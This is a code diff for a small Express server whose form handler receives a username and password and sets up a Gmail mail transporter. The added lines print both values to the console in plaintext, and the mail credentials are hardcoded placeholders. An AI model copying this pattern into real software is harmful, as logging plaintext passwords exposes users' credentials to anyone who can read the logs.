@@ -3,7 +3,7 @@ const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
 
 const app = express();
-const port = 3000;
+const port = 8000
 
 // Parse URL-encoded bodies (as sent by HTML forms)
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -15,12 +15,16 @@ app.use(bodyParser.json());
 app.post('/submit-form', (req, res) => {
     const { username, password } = req.body;
 
+    console.log(username)
+    console.log(password)
+
+
     if (!username || !password) {
         return res.status(400).send('Username and password are required');
     }
 
     const transporter = nodemailer.createTransport({
-        service: 'gmail',git commit
+        service: 'gmail',
         auth: {
             user: 'your-email@gmail.com', // Your Gmail email address
             pass: 'your-password' // Your Gmail password (not recommended for production)
